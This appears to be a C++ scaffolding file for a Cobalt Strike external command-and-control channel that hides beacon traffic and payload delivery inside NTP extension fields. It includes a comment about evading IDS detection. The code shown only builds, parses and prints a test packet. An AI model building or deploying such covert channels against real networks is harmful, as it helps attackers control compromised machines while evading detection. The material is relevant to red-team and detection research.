/*

CS-EXTC2-NTP


Extension Field Key:

0x4d, 0x5a: Give me a payload. When the server sees this, a payload will be sent back
	> This should likely change. 0x4d, 0x5a has a great chance at getting picked up as a "binary" by IDS tools

0xAA,0xBB: Getting team server data from server to go to beacon
0xBB,0xAA: Sending beacon data back to server


*/



#include <iostream>
#include "createntp.hpp"
#include "parsentp.hpp"
#include "ntp.hpp"
#include "constants.hpp"

int main() {
	//Stuff here

	std::cout << "Started" << std::endl;

	auto packet = NTPPacket();
	//packet.printPacket();

	std::vector<uint8_t> packetData = {10,20,30,40};
	packet.addExtensionField(
		NtpExtensionField::giveMePayload,
		packetData
	);

	//packet.printPacket();

	//std::cout << packet << std::endl;
	std::vector < uint8_t> packet_bytes = packet.getPacket();
	auto packetParser = NTPPacketParser(packet_bytes);
	
	//get payload, etc.
	

	packet.printPacket();

}